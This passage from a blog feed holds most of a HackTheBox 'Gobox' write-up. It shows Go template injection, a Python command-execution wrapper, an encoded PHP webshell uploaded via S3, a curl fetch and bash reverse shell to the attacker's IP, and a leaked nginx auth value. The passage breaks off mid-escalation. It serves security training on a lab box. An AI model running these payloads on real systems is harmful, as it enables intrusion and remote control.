-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
</code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way 😅.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Gobox</title>
      <link>https://fahmifj.github.io/hackthebox/gobox/</link>
      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/gobox/</guid>
      <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
      <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows  me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p>
<p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>Golang SSTI</li>
<li>Source Code Analysis</li>
<li>Scripting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ fscan 10.10.11.113 gobox
nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
Nmap scan report <span class="k">for</span> 10.10.11.113
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
8080/tcp open  http    nginx
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
<p>The site on port 80 is a Hacking eSports homepage.</p>
<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
</p>
<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog is based on Go).</p>
<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
</p>
<p>Nothing else to see here.</p>
<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
<p>On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.</p>
<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
</p>
<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ curl -s -I http://10.10.11.113:8080       
HTTP/1.1 <span class="m">200</span> OK
Server: nginx
Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
Connection: keep-alive
X-Forwarded-Server: golang
</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
</p>
<p>The following is how the HTTP request and the HTTP response look like.</p>
<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="container-root">Container root</h3>
<h4 id="ssti">SSTI</h4>
<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
</code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
</p>
<p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
</p>
<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
</p>
<h4 id="rce">RCE</h4>
<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">...</span>
</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
</p>
<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
</p>
<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">import</span> <span class="nn">html</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># hacky curly braces</span>
<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>

<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>

	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
	<span class="k">try</span><span class="p">:</span>	
		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
&gt; id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
&gt; uname -a
Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="s3-enumeration">S3 enumeration</h4>
<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
&gt; aws 
usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
To see <span class="nb">help</span> text, you can run:

  aws <span class="nb">help</span>
  aws &lt;command&gt; <span class="nb">help</span>
  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
2021-09-07 07:32:42 website
</code></pre></div><p>The bucket contains 4 files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
PRE css/
2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
2021-09-07 07:32:42     <span class="m">165551</span> header.png
2021-09-07 07:32:42          <span class="m">5</span> index.html
2021-09-07 07:32:42       <span class="m">1803</span> index.php
</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
&gt; cat /tmp/id.php
&lt;!DOCTYPE html&gt;
&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;

&lt;head&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I also find that I have write access on this bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
&gt; aws s3 cp /tmp/iamf.php s3://website/
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
</p>
<p>Also, instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p>
<h4 id="webshell">Webshell</h4>
<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php

&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
</p>
<p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@gobox:/opt/website$
</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «gobox» «10.10.14.97»
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>

www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
www-data@gobox:/$ ls -lR /home/ubuntu
/home/ubuntu:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
www-data@gobox:/$ cat /home/ubuntu/user.txt
d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href="#explore">explore</a> section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>


        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>

        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>

        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>


        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>

<span class="c1"># Homepage
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>

        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>


            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># Login page
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># unknown
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nmap -sV -sC -p4566 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
4566/tcp open  http    nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
</code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
